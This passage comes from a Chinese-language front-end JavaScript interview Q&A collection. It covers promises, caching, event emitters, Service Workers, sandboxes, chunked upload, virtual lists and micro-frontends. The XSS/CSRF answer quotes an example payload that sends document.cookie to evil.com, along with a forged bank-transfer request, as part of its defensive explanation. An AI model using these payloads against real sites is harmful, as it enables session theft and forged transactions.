      if (typeof prop === 'string' && prop.startsWith('_')) {
        throw new Error('Access denied')
      }
      obj[prop] = value
      return true
    }
  })
}

// 3. 自动创建嵌套对象
const tree = new Proxy({}, {
  get(obj, prop) {
    if (!(prop in obj)) {
      obj[prop] = new Proxy({}, this)
    }
    return obj[prop]
  }
})
tree.a.b.c = 1  // 自动创建嵌套结构

// 4. Vue3 响应式原理（简化版）
const reactive = (obj) => new Proxy(obj, {
  get(target, key) {
    track(target, key)  // 收集依赖
    return target[key]
  },
  set(target, key, value) {
    target[key] = value
    trigger(target, key)  // 触发更新
    return true
  }
})

// Reflect（配合 Proxy 使用）
// 替代直接操作对象，更规范
Reflect.get(obj, 'name')
Reflect.set(obj, 'age', 30)
Reflect.has(obj, 'name')
Reflect.deleteProperty(obj, 'name')
Reflect.ownKeys(obj)
```

---

## Q21. 手写实现 Promise.all / Promise.race / Promise.any

**答：**

```javascript
// Promise.all
Promise.myAll = function(promises) {
  return new Promise((resolve, reject) => {
    const results = []
    let completed = 0
    
    if (promises.length === 0) {
      resolve([])
      return
    }
    
    promises.forEach((p, i) => {
      Promise.resolve(p)
        .then(value => {
          results[i] = value
          completed++
          if (completed === promises.length) {
            resolve(results)
          }
        })
        .catch(reject)
    })
  })
}

// Promise.race
Promise.myRace = function(promises) {
  return new Promise((resolve, reject) => {
    promises.forEach(p => {
      Promise.resolve(p).then(resolve, reject)
    })
  })
}

// Promise.any
Promise.myAny = function(promises) {
  return new Promise((resolve, reject) => {
    const errors = []
    let rejected = 0
    
    if (promises.length === 0) {
      reject(new AggregateError([], 'All promises were rejected'))
      return
    }
    
    promises.forEach((p, i) => {
      Promise.resolve(p)
        .then(resolve)
        .catch(error => {
          errors[i] = error
          rejected++
          if (rejected === promises.length) {
            reject(new AggregateError(errors, 'All promises were rejected'))
          }
        })
    })
  })
}

// Promise.allSettled
Promise.myAllSettled = function(promises) {
  return new Promise(resolve => {
    const results = []
    let completed = 0
    
    if (promises.length === 0) {
      resolve([])
      return
    }
    
    const handleResult = (i, result) => {
      results[i] = result
      completed++
      if (completed === promises.length) {
        resolve(results)
      }
    }
    
    promises.forEach((p, i) => {
      Promise.resolve(p)
        .then(value => handleResult(i, { status: 'fulfilled', value }))
        .catch(reason => handleResult(i, { status: 'rejected', reason }))
    })
  })
}

// 测试
Promise.myAll([1, 2, Promise.resolve(3)])
  .then(console.log)  // [1, 2, 3]

Promise.myAny([
  Promise.reject('e1'),
  Promise.resolve('success'),
  Promise.reject('e2')
])
  .then(console.log)  // 'success'
```

---

## Q22. 数组去重有哪些方法？

**答：**

```javascript
const arr = [1, 2, 2, 3, 1, '1', { a: 1 }, { a: 1 }]

// 1. Set（最简单，推荐）
const unique1 = [...new Set(arr)]
// 注意：对象引用不同，不会被去重

// 2. filter + indexOf
const unique2 = arr.filter((item, index) => 
  arr.indexOf(item) === index
)

// 3. reduce
const unique3 = arr.reduce((acc, item) => 
  acc.includes(item) ? acc : [...acc, item]
, [])

// 4. forEach + 对象（可处理对象深相等）
function deepUnique(arr) {
  const seen = new Map()
  return arr.filter(item => {
    const key = typeof item === 'object' ? JSON.stringify(item) : item
    if (seen.has(key)) return false
    seen.set(key, true)
    return true
  })
}

// 5. 排序后去重（改变顺序）
arr.sort().filter((item, i, a) => item !== a[i - 1])

// 对象数组去重
const users = [{ id: 1, name: 'Tom' }, { id: 1, name: 'Jerry' }]
const usersUnique = users.filter((u, i, arr) => 
  arr.findIndex(item => item.id === u.id) === i
)

// 复杂度优化（哈希表）
function uniqueWithHash(arr) {
  const seen = new Set()
  return arr.filter(item => {
    if (seen.has(item)) return false
    seen.add(item)
    return true
  })
}
```

---

## Q23. 实现一个 LRU 缓存

**答：**

```javascript
class LRUCache {
  constructor(capacity) {
    this.capacity = capacity
    this.cache = new Map()  // Map 保持插入顺序
  }
  
  get(key) {
    if (!this.cache.has(key)) return -1
    
    // 移动到最新（删除后重新插入）
    const value = this.cache.get(key)
    this.cache.delete(key)
    this.cache.set(key, value)
    return value
  }
  
  put(key, value) {
    if (this.cache.has(key)) {
      this.cache.delete(key)
    } else if (this.cache.size >= this.capacity) {
      // 删除最久未使用（Map 第一个）
      const oldest = this.cache.keys().next().value
      this.cache.delete(oldest)
    }
    this.cache.set(key, value)
  }
}

// 测试
const cache = new LRUCache(2)
cache.put(1, 1)  // [1]
cache.put(2, 2)  // [1, 2]
cache.get(1)     // 返回 1，[2, 1]
cache.put(3, 3)  // 删除 2，[1, 3]
cache.get(2)     // -1（不存在）
cache.put(4, 4)  // 删除 1，[3, 4]
cache.get(1)     // -1
cache.get(3)     // 3，[4, 3]

// WeakMap 版本（允许垃圾回收）
class WeakLRUCache {
  constructor(capacity) {
    this.capacity = capacity
    this.cache = new Map()
    this.weakRefs = new WeakMap()
  }
}
```

---

## Q24. 如何实现一个 EventEmitter/EventBus？

**答：**

```javascript
class EventEmitter {
  constructor() {
    this.events = {}
  }
  
  // 监听事件
  on(event, listener) {
    if (!this.events[event]) {
      this.events[event] = []
    }
    this.events[event].push(listener)
    
    // 返回取消订阅函数
    return () => this.off(event, listener)
  }
  
  // 一次性监听
  once(event, listener) {
    const onceWrapper = (...args) => {
      this.off(event, onceWrapper)
      listener.apply(this, args)
    }
    this.on(event, onceWrapper)
  }
  
  // 取消监听
  off(event, listenerToRemove) {
    if (!this.events[event]) return
    
    this.events[event] = this.events[event].filter(
      listener => listener !== listenerToRemove
    )
  }
  
  // 触发事件
  emit(event, ...args) {
    if (!this.events[event]) return
    
    this.events[event].forEach(listener => {
      listener.apply(this, args)
    })
  }
  
  // 移除所有监听器
  removeAllListeners(event) {
    if (event) {
      delete this.events[event]
    } else {
      this.events = {}
    }
  }
  
  // 获取监听器数量
  listenerCount(event) {
    return this.events[event]?.length || 0
  }
}

// 使用
const emitter = new EventEmitter()

// 订阅
const unsubscribe = emitter.on('user:login', (user) => {
  console.log('User logged in:', user.name)
})

emitter.once('app:ready', () => {
  console.log('App is ready!')
})

// 触发
emitter.emit('user:login', { name: 'Tom' })
emitter.emit('app:ready')  // 执行一次
emitter.emit('app:ready')  // 不再执行

// 取消订阅
unsubscribe()

// Vue3 风格用法（更易用）
class EventBus extends EventEmitter {
  // 命名空间自动触发
  emitAll(namespace, ...args) {
    Object.keys(this.events)
      .filter(key => key.startsWith(namespace + ':'))
      .forEach(event => this.emit(event, ...args))
  }
}

// 前端事件总线（Vue2 风格）
class VueStyleEventBus {
  constructor() {
    this._events = {}
  }
  
  $on(event, fn) {
    (this._events[event] || (this._events[event] = [])).push(fn)
  }
  
  $off(event, fn) {
    if (!this._events[event]) return
    if (!fn) {
      this._events[event] = null
      return
    }
    const index = this._events[event].indexOf(fn)
    if (index > -1) this._events[event].splice(index, 1)
  }
  
  $emit(event, ...args) {
    const cbs = this._events[event]
    if (cbs) {
      cbs.forEach(cb => cb.apply(this, args))
    }
  }
}
```

---

## Q25. 实现一个 Flatten 数组方法

**答：**

```javascript
// 1. 递归
function flatten(arr, depth = Infinity) {
  if (depth === 0) return arr
  
  return arr.reduce((acc, item) => {
    if (Array.isArray(item)) {
      return acc.concat(flatten(item, depth - 1))
    }
    return acc.concat(item)
  }, [])
}

// 2. 迭代（避免栈溢出）
function flattenIterative(arr, depth = Infinity) {
  const stack = [...arr.map(item => [item, depth])]
  const result = []
  
  while (stack.length) {
    const [item, currentDepth] = stack.pop()
    
    if (Array.isArray(item) && currentDepth > 0) {
      stack.push(...item.map(i => [i, currentDepth - 1]).reverse())
    } else {
      result.push(item)
    }
  }
  
  return result.reverse()
}

// 3. 生成器（惰性求值）
function* flattenGenerator(arr, depth = Infinity) {
  for (const item of arr) {
    if (Array.isArray(item) && depth > 0) {
      yield* flattenGenerator(item, depth - 1)
    } else {
      yield item
    }
  }
}

// 使用
const nested = [1, [2, [3, [4, 5]]]]
flatten(nested)           // [1, 2, 3, 4, 5]
flatten(nested, 1)        // [1, 2, [3, [4, 5]]]
flatten(nested, 2)        // [1, 2, 3, [4, 5]]

// 使用生成器
const flattened = [...flattenGenerator(nested)]

// 处理其他可迭代对象
function flattenDeep(arr) {
  return arr.flat(Infinity)  // ES2019 原生方法
}

// 去重并排序
const uniqueSorted = [...new Set(flatten(arr))].sort((a, b) => a - b)
```

---

## Q26. 如何理解 JavaScript 的内存泄漏？如何避免？

**答：**

**内存泄漏**是指程序中已分配的内存由于某种原因未被释放或无法被垃圾回收，导致内存占用持续增长。

### 常见内存泄漏场景

```javascript
// 1. 意外全局变量
function leak() {
  leaked = 'I am global'  // 未声明，自动成为 window 属性
}

// 2. 被遗忘的定时器
const timer = setInterval(() => {
  // 引用了外部变量
  console.log(data)
}, 1000)
// 忘记 clearInterval(timer)

// 3. 循环引用（旧 IE）
function cycle() {
  const a = {}
  const b = {}
  a.ref = b
  b.ref = a
  // 现代浏览器 Mark-and-Sweep 可以处理
}

// 4. DOM 引用未清理
const elements = {
  button: document.getElementById('button')
}
document.body.removeChild(elements.button)
// elements.button 仍然保留引用，无法回收

// 5. 闭包导致的泄漏
function outer() {
  const hugeData = new Array(1000000)
  return function() {
    // 即使只用了一个元素，整个数组都在内存中
    return hugeData[0]
  }
}

// 6. 事件监听器未移除
element.addEventListener('click', handler)
// 元素被移除前未移除监听器
element.removeEventListener('click', handler)
```

### 避免方法

```javascript
// 1. 使用严格模式避免意外全局变量
'use strict'

// 2. 及时清理定时器和事件监听
const cleanup = () => {
  clearInterval(timer)
  clearTimeout(timeout)
  element.removeEventListener('click', handler)
}

// 3. 使用 WeakMap/WeakSet
const cache = new WeakMap()  // 不会阻止垃圾回收

// 4. 组件卸载时清理
class Component {
  destroy() {
    this.observer?.disconnect()
    this.timers.forEach(clearInterval)
    this.listeners.forEach(({ el, type, fn }) => {
      el.removeEventListener(type, fn)
    })
  }
}

// 5. Chrome DevTools 内存分析
// Performance -> Memory -> Take Heap Snapshot
// 对比两次快照找出增长的对象
```

---

## Q27. 什么是 Service Worker？有什么应用场景？

**答：**

**Service Worker** 是一种在浏览器后台独立脚本运行的 Web Worker，可拦截和处理网络请求、管理缓存，是实现离线体验的核心技术。

```javascript
// 注册 Service Worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(registration => {
      console.log('SW registered:', registration)
    })
    .catch(error => {
      console.log('SW registration failed:', error)
    })
}

// sw.js - Service Worker 脚本
const CACHE_NAME = 'v1'
const urlsToCache = [
  '/',
  '/styles.css',
  '/app.js',
  '/icon.png'
]

// 安装时缓存资源
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(urlsToCache))
  )
})

// 拦截网络请求
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request)
      .then(response => {
        // 命中缓存返回缓存
        if (response) {
          return response
        }
        // 否则请求网络
        return fetch(event.request)
          .then(response => {
            // 缓存新资源
            const responseToCache = response.clone()
            caches.open(CACHE_NAME)
              .then(cache => {
                cache.put(event.request, responseToCache)
              })
            return response
          })
      })
  )
})

// 清理旧缓存
self.addEventListener('activate', event => {
  event.waitUntil(
    caches.keys().then(cacheNames => {
      return Promise.all(
        cacheNames.map(cacheName => {
          if (cacheName !== CACHE_NAME) {
            return caches.delete(cacheName)
          }
        })
      )
    })
  )
})

// 推送通知
self.addEventListener('push', event => {
  const data = event.data.json()
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icon.png'
    })
  )
})

// 后台同步
self.addEventListener('sync', event => {
  if (event.tag === 'sync-messages') {
    event.waitUntil(syncMessages())
  }
})
```

### 应用场景

- **离线访问** - 缓存核心资源，离线时也能使用
- **推送通知** - 即使用户未打开网站也能接收通知
- **后台同步** - 网络恢复后自动同步数据
- **拦截请求** - 自定义缓存策略、图片压缩等

---

## Q28. 什么是 Webpack 的 Tree Shaking？如何实现？

**答：**

**Tree Shaking** 是一种通过静态分析消除死代码（Dead Code Elimination）的优化技术，由 Webpack/Rollup 等打包器实现。

```javascript
// utils.js
export function add(a, b) {
  return a + b
}

export function subtract(a, b) {
  return a - b
}

export function unused() {
  return 'never used'
}

// main.js - 只导入 add
import { add } from './utils.js'
console.log(add(1, 2))
// subtract 和 unused 会被 Tree Shaking 移除

// 实现条件
// 1. 使用 ES Module（import/export）
// 2. 代码无副作用
// 3. 生产模式（mode: 'production'）

// package.json 标记无副作用
{
  "sideEffects": false
  // 或指定有副作用的文件
  // "sideEffects": ["*.css", "*.scss"]
}

// 代码层面避免副作用
// 好：纯函数，可以被 Tree Shaking
export const config = {
  api: '/api'
}

// 不好：有副作用，无法被安全移除
export const config = createConfig()  // 函数调用可能有副作用

// 使用 /*#__PURE__*/ 注释标记无副作用
export const PureComponent = /*#__PURE__*/ defineComponent({...})
```

---

## Q29. 如何手写一个 AJAX/fetch 的封装？

**答：**

```javascript
// 基于 fetch 的请求库
class HttpClient {
  constructor(baseURL = '', options = {}) {
    this.baseURL = baseURL
    this.defaultOptions = {
      headers: {
        'Content-Type': 'application/json'
      },
      ...options
    }
    this.interceptors = {
      request: [],
      response: []
    }
  }

  // 添加拦截器
  addRequestInterceptor(onFulfilled, onRejected) {
    this.interceptors.request.push({ onFulfilled, onRejected })
  }

  addResponseInterceptor(onFulfilled, onRejected) {
    this.interceptors.response.push({ onFulfilled, onRejected })
  }

  async request(url, options = {}) {
    const config = {
      ...this.defaultOptions,
      ...options,
      headers: {
        ...this.defaultOptions.headers,
        ...options.headers
      }
    }

    // 请求拦截器
    for (const interceptor of this.interceptors.request) {
      try {
        config = await interceptor.onFulfilled?.(config) ?? config
      } catch (error) {
        interceptor.onRejected?.(error)
        throw error
      }
    }

    const fullURL = url.startsWith('http') ? url : this.baseURL + url

    try {
      let response = await fetch(fullURL, config)

      // 响应拦截器
      for (const interceptor of this.interceptors.response) {
        try {
          response = await interceptor.onFulfilled?.(response) ?? response
        } catch (error) {
          interceptor.onRejected?.(error)
          throw error
        }
      }

      // 自动解析 JSON
      if (response.headers.get('content-type')?.includes('application/json')) {
        const data = await response.json()
        if (!response.ok) {
          throw new Error(data.message || 'Request failed')
        }
        return data
      }

      return response.text()
    } catch (error) {
      // 统一错误处理
      console.error('Request error:', error)
      throw error
    }
  }

  get(url, params) {
    const query = params ? '?' + new URLSearchParams(params) : ''
    return this.request(url + query, { method: 'GET' })
  }

  post(url, data) {
    return this.request(url, {
      method: 'POST',
      body: JSON.stringify(data)
    })
  }

  upload(url, file) {
    const formData = new FormData()
    formData.append('file', file)
    return this.request(url, {
      method: 'POST',
      body: formData
    })
  }
}

// 使用
const http = new HttpClient('/api', {
  headers: { 'X-API-Key': 'xxx' }
})

// 添加拦截器
http.addRequestInterceptor(
  config => {
    config.headers.Authorization = 'Bearer ' + getToken()
    return config
  }
)

http.addResponseInterceptor(
  response => response,
  error => {
    if (error.status === 401) {
      logout()
    }
    return Promise.reject(error)
  }
)

// 使用
const data = await http.get('/users', { page: 1 })
const newUser = await http.post('/users', { name: 'Tom' })
```

---

## Q30. 什么是 JavaScript 的沙箱（Sandbox）？如何实现？

**答：**

**沙箱**是一种安全机制，用于隔离不受信任的代码，防止其访问敏感资源或影响主程序。

```javascript
// 1. 使用 iframe + sandbox
<iframe sandbox="allow-scripts" src="untrusted.html"></iframe>

// 2. Web Worker（完全隔离）
const worker = new Worker('untrusted.js')
worker.postMessage(data)  // 只能通过消息通信

// 3. VM 模块（Node.js）
const vm = require('vm')
const sandbox = { console, Math }
vm.runInNewContext('console.log(Math.random())', sandbox)

// 4. Proxy 实现受限执行环境
function createSandbox() {
  const allowed = new Set(['Math', 'Date', 'JSON', 'console'])
  
  return new Proxy({}, {
    has(target, key) {
      return allowed.has(key)
    },
    get(target, key) {
      if (allowed.has(key)) {
        return globalThis[key]
      }
      return undefined
    }
  })
}

// 5. with + Proxy 更严格的沙箱
function safeEval(code, context = {}) {
  const sandbox = new Proxy(context, {
    has(target, key) {
      return key in target || key === 'console'
    },
    get(target, key) {
      if (key === 'console') return console
      return target[key]
    }
  })
  
  const fn = new Function('sandbox', `with(sandbox) { return ${code} }`)
  return fn(sandbox)
}

// 使用
const result = safeEval('Math.abs(-5) + a', { a: 10 })  // 15
// safeEval('process.exit()')  // 无法访问，返回 undefined

// 6. Realms（现代提案）
// const realm = new Realm()
// realm.evaluate('1 + 2')  // 3
```

---

## Q31. 如何实现大文件上传的分片处理？

**答：**

```javascript
class FileUploader {
  constructor(options = {}) {
    this.chunkSize = options.chunkSize || 1024 * 1024  // 默认 1MB
    this.maxRetries = options.maxRetries || 3
    this.maxConcurrency = options.maxConcurrency || 3
  }

  // 计算文件 hash
  async calculateHash(file) {
    const buffer = await file.slice(0, 1024 * 1024).arrayBuffer()
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer)
    return Array.from(new Uint8Array(hashBuffer))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('')
  }

  // 分片
  createChunks(file) {
    const chunks = []
    const count = Math.ceil(file.size / this.chunkSize)
    
    for (let i = 0; i < count; i++) {
      const start = i * this.chunkSize
      const end = Math.min(start + this.chunkSize, file.size)
      chunks.push({
        index: i,
        start,
        end,
        blob: file.slice(start, end),
        hash: null
      })
    }
    
    return chunks
  }

  // 上传单个分片
  async uploadChunk(chunk, fileHash) {
    const formData = new FormData()
    formData.append('chunk', chunk.blob)
    formData.append('index', chunk.index)
    formData.append('hash', fileHash)

    for (let i = 0; i < this.maxRetries; i++) {
      try {
        const response = await fetch('/api/upload/chunk', {
          method: 'POST',
          body: formData
        })
        if (response.ok) return await response.json()
      } catch (error) {
        if (i === this.maxRetries - 1) throw error
        await new Promise(r => setTimeout(r, 1000 * (i + 1)))
      }
    }
  }

  // 并发控制上传
  async upload(file, onProgress) {
    const fileHash = await this.calculateHash(file)
    const chunks = this.createChunks(file)
    const total = chunks.length
    let completed = 0

    // 检查已上传的分片
    const checkResponse = await fetch(`/api/upload/check?hash=${fileHash}`)
    const { uploadedChunks = [] } = await checkResponse.json()

    const pending = chunks.filter(c => !uploadedChunks.includes(c.index))

    // 并发上传
    const pool = []
    for (const chunk of pending) {
      const promise = this.uploadChunk(chunk, fileHash)
        .then(() => {
          completed++
          onProgress?.(completed / total)
        })
      
      pool.push(promise)
      
      if (pool.length >= this.maxConcurrency) {
        await Promise.race(pool)
        pool.splice(pool.findIndex(p => p === promise), 1)
      }
    }

    await Promise.all(pool)

    // 合并分片
    return fetch('/api/upload/merge', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ hash: fileHash, total })
    })
  }
}

// 断点续传版本
class ResumableUploader extends FileUploader {
  async upload(file, onProgress) {
    const fileHash = await this.calculateHash(file)
    
    // 从 localStorage 恢复进度
    const saved = localStorage.getItem(`upload:${fileHash}`)
    const progress = saved ? JSON.parse(saved) : { completed: [], total: 0 }
    
    // ...上传逻辑...
    
    // 保存进度
    localStorage.setItem(`upload:${fileHash}`, JSON.stringify({
      completed: [...progress.completed, chunk.index],
      total: chunks.length
    }))
  }
}
```

---

## Q32. 如何实现前端路由的懒加载？

**答：**

```javascript
// 原生实现（不依赖框架）
class Router {
  constructor(routes = []) {
    this.routes = routes
    this.currentRoute = null
    this.cache = new Map()  // 组件缓存
  }

  async navigate(path) {
    const route = this.routes.find(r => this.matchPath(r.path, path))
    if (!route) return

    // 已缓存，直接使用
    if (this.cache.has(path)) {
      this.render(this.cache.get(path))
      return
    }

    // 显示加载状态
    this.showLoading()

    try {
      // 动态导入组件
      let component
      if (typeof route.component === 'function') {
        component = await route.component()
      } else {
        component = route.component
      }

      // 缓存组件
      this.cache.set(path, component)
      this.render(component)
      
      // 更新历史
      history.pushState({ path }, '', path)
      this.currentRoute = route
    } catch (error) {
      console.error('Route load failed:', error)
    } finally {
      this.hideLoading()
    }
  }

  matchPath(pattern, path) {
    // 简化版路由匹配
    return pattern === path || 
           (pattern.includes(':') && path.startsWith(pattern.split('/:')[0]))
  }

  render(component) {
    const container = document.getElementById('app')
    container.innerHTML = ''
    if (typeof component === 'function') {
      container.appendChild(component())
    } else {
      container.appendChild(component)
    }
  }

  showLoading() {
    document.getElementById('loading')?.classList.remove('hidden')
  }

  hideLoading() {
    document.getElementById('loading')?.classList.add('hidden')
  }
}

// 使用
const router = new Router([
  {
    path: '/',
    component: () => import('./pages/Home.js')
  },
  {
    path: '/about',
    component: () => import('./pages/About.js')
  },
  {
    path: '/user/:id',
    component: async () => {
      // 预加载数据
      const data = await fetch('/api/user').then(r => r.json())
      return UserPage(data)
    }
  }
])

// Vue 风格
const routes = [
  {
    path: '/',
    component: () => import('./views/Home.vue')  // 异步组件
  },
  {
    path: '/heavy',
    component: () => ({
      component: import('./views/Heavy.vue'),
      loading: LoadingComponent,
      error: ErrorComponent,
      delay: 200,       // 显示 loading 的延迟
      timeout: 3000    // 超时时间
    })
  }
]
```

---

## Q33. 什么是前端安全？XSS 和 CSRF 如何防御？

**答：**

### XSS（跨站脚本攻击）

```javascript
// XSS 类型：
// 1. 存储型 - 恶意脚本存入数据库
// 2. 反射型 - URL 参数包含恶意脚本
// 3. DOM 型 - 前端 JS 直接操作 DOM

// 攻击示例
// <img src="x" onerror="fetch('http://evil.com/steal?cookie=' + document.cookie)">

// 防御方法

// 1. 输入过滤
function sanitizeHTML(str) {
  return str.replace(/[<>"']/g, (char) => ({
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  }[char]))
}

// 2. 使用 DOMPurify 库
// import DOMPurify from 'dompurify'
// const clean = DOMPurify.sanitize(dirtyHTML)

// 3. Content Security Policy (CSP)
// <meta http-equiv="Content-Security-Policy" 
//       content="default-src 'self'; script-src 'self' 'nonce-xxx';">

// 4. HttpOnly Cookie
// Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
// HttpOnly 防止 JS 访问 cookie
```

### CSRF（跨站请求伪造）

```javascript
// 攻击：诱导用户访问恶意页面，自动发起请求到目标网站
// <!-- 恶意页面 -->
// <img src="https://bank.com/transfer?to=attacker&amount=10000">

// 防御方法

// 1. CSRF Token
// 后端生成随机 token，前端请求时携带
fetch('/api/transfer', {
  headers: {
    'X-CSRF-Token': getToken()  // 从 cookie 或 meta 标签获取
  }
})

// 2. SameSite Cookie
// Set-Cookie: session=xxx; SameSite=Strict
// Strict: 完全禁止第三方请求携带 cookie
// Lax: 允许 GET 请求，禁止 POST

// 3. 二次确认
// 转账需要输入密码或短信验证码

// 4. Referer/Origin 检查
// 后端检查请求来源是否合法
```

### 其他安全措施

```javascript
// 1. HTTPS - 防止中间人攻击
// 2. 子资源完整性 (SRI)
// <script src="https://cdn.com/lib.js" 
//         integrity="sha384-xxx..."
//         crossorigin="anonymous"></script>

// 3. iframe 隔离
// <iframe sandbox="allow-scripts">
```

---

## Q34. 如何实现前端日志系统？

**答：**

```javascript
class Logger {
  constructor(options = {}) {
    this.levels = { DEBUG: 0, INFO: 1, WARN: 2, ERROR: 3, FATAL: 4 }
    this.level = options.level || 'DEBUG'
    this.queue = []
    this.maxQueueSize = 100
    this.flushInterval = 5000  // 5秒自动发送
    
    // 劫持原生 console
    this.hookConsole()
    
    // 监听全局错误
    this.catchGlobalErrors()
    
    // 定时 flush
    setInterval(() => this.flush(), this.flushInterval)
  }

  hookConsole() {
    const original = {
      log: console.log,
      info: console.info,
      warn: console.warn,
      error: console.error
    }

    console.log = (...args) => {
      this.log('INFO', ...args)
      original.log.apply(console, args)
    }
    console.info = (...args) => {
      this.log('INFO', ...args)
      original.info.apply(console, args)
    }
    console.warn = (...args) => {
      this.log('WARN', ...args)
      original.warn.apply(console, args)
    }
    console.error = (...args) => {
      this.log('ERROR', ...args)
      original.error.apply(console, args)
    }
  }

  catchGlobalErrors() {
    window.addEventListener('error', (event) => {
      this.log('ERROR', {
        message: event.message,
        filename: event.filename,
        lineno: event.lineno,
        colno: event.colno,
        error: event.error?.stack
      })
    })

    window.addEventListener('unhandledrejection', (event) => {
      this.log('ERROR', {
        message: 'Unhandled Promise Rejection',
        reason: event.reason?.toString?.()
      })
    })
  }

  log(level, ...args) {
    if (this.levels[level] < this.levels[this.level]) return

    const logEntry = {
      level,
      timestamp: new Date().toISOString(),
      message: args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
      ).join(' '),
      url: window.location.href,
      userAgent: navigator.userAgent,
      sessionId: this.getSessionId()
    }

    this.queue.push(logEntry)

    // 错误立即发送，其他批量发送
    if (level === 'ERROR' || level === 'FATAL') {
      this.flush()
    }

    // 队列满了也发送
    if (this.queue.length >= this.maxQueueSize) {
      this.flush()
    }
  }

  getSessionId() {
    let id = sessionStorage.getItem('log_session_id')
    if (!id) {
      id = Date.now().toString(36) + Math.random().toString(36).substr(2)
      sessionStorage.setItem('log_session_id', id)
    }
    return id
  }

  async flush() {
    if (this.queue.length === 0) return

    const logs = this.queue.splice(0, this.queue.length)
    
    try {
      // 使用 sendBeacon（页面关闭也能发送）
      const success = navigator.sendBeacon?.(
        '/api/logs',
        JSON.stringify(logs)
      )
      
      if (!success) {
        // 降级 fetch
        await fetch('/api/logs', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(logs)
        })
      }
    } catch (error) {
      // 发送失败，存回队列（保留最近的）
      this.queue.unshift(...logs.slice(-this.maxQueueSize))
    }
  }
}

// 使用
const logger = new Logger({ level: 'INFO' })
logger.log('INFO', 'User logged in', { userId: 123 })
console.error('API failed')  // 自动捕获
```

---

## Q35. 如何实现前端虚拟列表？

**答：**

```javascript
// 虚拟列表（Virtual List）- 只渲染可见区域
class VirtualList {
  constructor(container, options) {
    this.container = container
    this.itemHeight = options.itemHeight || 50
    this.totalCount = options.totalCount
    this.renderItem = options.renderItem
    this.bufferSize = options.bufferSize || 5  // 缓冲区域

    this.visibleCount = Math.ceil(container.clientHeight / this.itemHeight)
    this.startIndex = 0
    this.endIndex = this.visibleCount + this.bufferSize

    this.init()
  }

  init() {
    // 创建内容区域
    this.content = document.createElement('div')
    this.content.style.position = 'relative'
    this.content.style.height = `${this.totalCount * this.itemHeight}px`
    this.container.appendChild(this.content)

    // 监听滚动
    this.container.addEventListener('scroll', () => this.onScroll())

    // 初始渲染
    this.render()
  }

  onScroll() {
    const scrollTop = this.container.scrollTop
    this.startIndex = Math.floor(scrollTop / this.itemHeight) - this.bufferSize
    this.startIndex = Math.max(0, this.startIndex)
    
    this.endIndex = this.startIndex + this.visibleCount + this.bufferSize * 2
    this.endIndex = Math.min(this.totalCount, this.endIndex)

    this.render()
  }

  render() {
    // 清理旧的
    this.content.innerHTML = ''

    // 创建可见区域的项
    const fragment = document.createDocumentFragment()
    
    for (let i = this.startIndex; i < this.endIndex; i++) {
      const item = document.createElement('div')
      item.style.position = 'absolute'
      item.style.top = `${i * this.itemHeight}px`
      item.style.height = `${this.itemHeight}px`
      item.style.width = '100%'
      
      // 渲染内容
      item.appendChild(this.renderItem(i))
      
      fragment.appendChild(item)
    }

    this.content.appendChild(fragment)
  }

  // 动态高度版本
  measureHeights() {
    // 如果高度不固定，需要预先测量或估算
    this.heightMap = new Array(this.totalCount)
    // ...
  }
}

// React/Vue 版本实现
// React
function VirtualList({ items, itemHeight, renderItem }) {
  const containerRef = useRef()
  const [scrollTop, setScrollTop] = useState(0)
  
  const totalHeight = items.length * itemHeight
  const startIndex = Math.floor(scrollTop / itemHeight)
  const visibleCount = Math.ceil(containerRef.current?.clientHeight / itemHeight || 10)
  const endIndex = Math.min(startIndex + visibleCount + 2, items.length)
  
  const visibleItems = items.slice(startIndex, endIndex)
  const offsetY = startIndex * itemHeight

  return (
    <div 
      ref={containerRef}
      style={{ height: '400px', overflow: 'auto' }}
      onScroll={e => setScrollTop(e.target.scrollTop)}
    >
      <div style={{ height: totalHeight, position: 'relative' }}>
        <div style={{ transform: `translateY(${offsetY}px)` }}>
          {visibleItems.map((item, index) => (
            <div key={startIndex + index} style={{ height: itemHeight }}>
              {renderItem(item, startIndex + index)}
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

// Vue
// <RecycleScroller :items="items" :item-size="50" key-field="id">
//   <template #default="{ item, index }">
//     <div>{{ item.name }}</div>
//   </template>
// </RecycleScroller>
```

---

## Q36. 什么是前端微前端架构？如何实现？

**答：**

**微前端**是将大型前端应用拆分为独立、可自治的子应用，每个子应用可以独立开发、部署。

```javascript
// 实现方式

// 1. iframe（最简单）
// 每个子应用一个 iframe，完全隔离
// 缺点：路由同步困难、性能差、样式隔离

// 2. Web Component
// 子应用封装成 Custom Element
class AppContainer extends HTMLElement {
  connectedCallback() {
    const shadow = this.attachShadow({ mode: 'open' })
    // 加载子应用
    loadApp(this.getAttribute('src'), shadow)
  }
}
customElements.define('app-container', AppContainer)

// 使用
// <app-container src="https://app1.com"></app-container>

// 3. Module Federation (Webpack 5)
// host 应用
import('remoteApp/ProductPage')  // 运行时加载远程模块

// remote 应用 webpack.config.js
module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'remoteApp',
      filename: 'remoteEntry.js',
      exposes: {
        './ProductPage': './src/ProductPage'
      }
    })
  ]
}

// 4. qiankun 框架（阿里开源）
import { registerMicroApps, start } from 'qiankun'

registerMicroApps([
  {
    name: 'app1',
    entry: '//app1.com',
    container: '#container',
    activeRule: '/app1'
  },
  {
    name: 'app2',
    entry: '//app2.com',
    container: '#container',
    activeRule: '/app2'
  }
])

start()

// 子应用需要暴露生命周期
export async function bootstrap() {}
export async function mount(props) {}
export async function unmount() {}
```

### 微前端的核心问题

```javascript
// 1. 样式隔离
// 使用 CSS Module、CSS-in-JS 或 Shadow DOM

// 2. JS 沙箱
// 快照沙箱
class SnapshotSandbox {
  constructor() {
    this.windowSnapshot = {}
    this.modifyPropsMap = {}
  }
  
  active() {
    // 保存当前 window 状态
